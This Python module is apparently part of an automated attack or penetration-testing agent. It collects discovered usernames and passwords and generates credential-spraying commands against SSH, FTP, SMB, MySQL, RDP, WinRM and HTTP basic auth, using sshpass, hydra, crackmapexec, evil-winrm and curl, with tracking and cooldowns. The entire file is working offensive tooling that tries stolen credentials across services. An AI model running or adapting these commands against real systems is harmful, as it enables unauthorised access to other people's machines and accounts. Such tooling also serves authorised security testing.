"""core/ops/credential_sprayer.py — Phase 41: Automated credential spraying.

When credentials are discovered, generates spray commands to attempt
them against all known services.  Tracks what has been tried.
"""
from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("ariaska.ops.credential_sprayer")


@dataclass
class CredentialSprayerConfig:
    """Configuration for credential spraying."""
    enabled: bool = True
    max_spray_attempts_per_cred: int = 10
    services_to_spray: List[str] = field(
        default_factory=lambda: [
            "ssh", "ftp", "smb", "mysql", "rdp", "winrm", "http_basic",
        ]
    )
    cooldown_per_service: int = 2
    service_priority: List[str] = field(
        default_factory=lambda: ["ssh", "smb", "mysql", "ftp", "rdp", "winrm", "http_basic"]
    )


@dataclass
class SprayResult:
    """Result of a credential spray attempt."""
    command: str = ""
    service: str = ""
    host: str = ""
    port: int = 0
    success: bool = False
    credential_used: str = ""


class CredentialSprayer:
    """Generates and tracks credential spray attempts across services."""

    def __init__(self, config: Optional[CredentialSprayerConfig] = None) -> None:
        self.config = config or CredentialSprayerConfig()
        self._credentials: List[Tuple[str, str, str]] = []  # (user, pass, source)
        self._services: List[Tuple[str, int, str]] = []  # (service, port, host)
        self._tried: Set[str] = set()  # "user:pass@service:host:port"
        self._results: List[SprayResult] = []
        self._step_counter: Dict[str, int] = {}  # service -> last spray step

    def register_credential(
        self, username: str, password: str, source: str = "unknown"
    ) -> None:
        """Register a discovered credential pair.

        Args:
            username: Username found.
            password: Password found.
            source: Where it was found (e.g. "hydra", "config_file").
        """
        key = f"{username}:{password}"
        if not any(f"{u}:{p}" == key for u, p, _ in self._credentials):
            self._credentials.append((username, password, source))
            logger.debug("Registered credential: %s (source: %s)", username, source)

    def register_service(
        self, service: str, port: int, host: str = "target"
    ) -> None:
        """Register a discovered service to spray against.

        Args:
            service: Service type (ssh, ftp, smb, etc).
            port: Port number.
            host: Target host.
        """
        key = (service.lower(), port, host)
        if key not in self._services:
            self._services.append(key)
            logger.debug("Registered spray target: %s:%d on %s", service, port, host)

    def get_spray_commands(
        self,
        max_commands: int = 3,
        current_step: int = 0,
    ) -> List[str]:
        """Generate spray commands for untried credential+service combos.

        Args:
            max_commands: Maximum commands to return.
            current_step: Current step number (for cooldown tracking).

        Returns:
            List of spray command strings.
        """
        if not self.config.enabled or not self._credentials or not self._services:
            return []

        commands: List[str] = []

        # Sort services by priority
        priority = {s: i for i, s in enumerate(self.config.service_priority)}
        sorted_services = sorted(
            self._services,
            key=lambda s: priority.get(s[0], 99),
        )

        for svc, port, host in sorted_services:
            if len(commands) >= max_commands:
                break

            # Check cooldown
            last_step = self._step_counter.get(f"{svc}:{host}:{port}", -999)
            if current_step - last_step < self.config.cooldown_per_service:
                continue

            for user, passwd, _ in self._credentials:
                if len(commands) >= max_commands:
                    break

                trial_key = f"{user}:{passwd}@{svc}:{host}:{port}"
                if trial_key in self._tried:
                    continue

                cmd = self._build_command(svc, host, port, user, passwd)
                if cmd:
                    commands.append(cmd)
                    self._tried.add(trial_key)
                    self._step_counter[f"{svc}:{host}:{port}"] = current_step

        return commands

    def record_result(
        self, cred_id: str, service: str, success: bool
    ) -> None:
        """Record the result of a spray attempt.

        Args:
            cred_id: Credential identifier (user:pass).
            service: Service sprayed.
            success: Whether login succeeded.
        """
        self._results.append(SprayResult(
            credential_used=cred_id, service=service, success=success,
        ))

    @property
    def success_rate(self) -> float:
        """Overall spray success rate."""
        if not self._results:
            return 0.0
        return sum(1 for r in self._results if r.success) / len(self._results)

    @property
    def total_tried(self) -> int:
        """Total unique spray attempts."""
        return len(self._tried)

    def _build_command(
        self, service: str, host: str, port: int, user: str, passwd: str
    ) -> Optional[str]:
        """Build the spray command string for a given service."""
        svc = service.lower()
        if svc == "ssh":
            return f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{host} -p {port} whoami"
        elif svc == "ftp":
            return f"hydra -l {user} -p {passwd} ftp://{host}:{port} -t 1"
        elif svc == "smb":
            return f"crackmapexec smb {host} -u {user} -p '{passwd}'"
        elif svc == "mysql":
            return f"mysql -h {host} -P {port} -u {user} -p'{passwd}' -e 'SELECT USER()'"
        elif svc == "rdp":
            return f"hydra -l {user} -p {passwd} rdp://{host}:{port}"
        elif svc == "winrm":
            return f"evil-winrm -i {host} -u {user} -p '{passwd}'"
        elif svc == "http_basic":
            return f"curl -u {user}:{passwd} http://{host}:{port}/ -s -o /dev/null -w '%{{http_code}}'"
        return None
